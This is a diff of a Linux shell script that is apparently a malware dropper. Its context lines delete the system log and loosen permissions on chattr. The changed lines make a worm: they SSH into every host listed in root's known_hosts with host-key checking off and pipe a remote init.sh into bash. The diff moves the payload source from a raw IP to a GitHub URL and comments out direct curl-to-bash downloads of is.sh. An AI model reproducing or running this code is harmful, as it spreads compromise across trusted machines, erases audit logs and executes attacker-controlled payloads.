@@ -1,5 +1,5 @@
 #!/bin/sh
-us=$(lspci)
+#us=$(lspci)
 ulimit -n 65535
 rm -rf /var/log/syslog
 chmod 777 /usr/bin/chattr
@@ -1006,13 +1006,13 @@ yum install -y bash 2>/dev/null
 apt install -y bash 2>/dev/null
 apt-get install -y bash 2>/dev/null
 if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
-  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://45.133.203.192/cleanfda/init.sh | bash >/dev/null 2>&1 &' & done
+  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  https://github.com/burn50/Hello-World/blob/main/init.sh | bash >/dev/null 2>&1 &' & done
 fi
 if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
-  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cd1 -o-  http://45.133.203.192/cleanfda/init.sh | bash >/dev/null 2>&1 &' & done
+  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cd1 -o-  https://github.com/burn50/Hello-World/blob/main/init.sh | bash >/dev/null 2>&1 &' & done
 fi
-echo "$bbdir"
-echo "$bbdira"
+#echo "$bbdir"
+#echo "$bbdira"
 
-$bbdir -fsSL http://45.133.203.192/cleanfda/is.sh | bash
-$bbdira -fsSL http://45.133.203.192/cleanfda/is.sh | bash
+#$bbdir -fsSL http://45.133.203.192/cleanfda/is.sh | bash
+#$bbdira -fsSL http://45.133.203.192/cleanfda/is.sh | bash
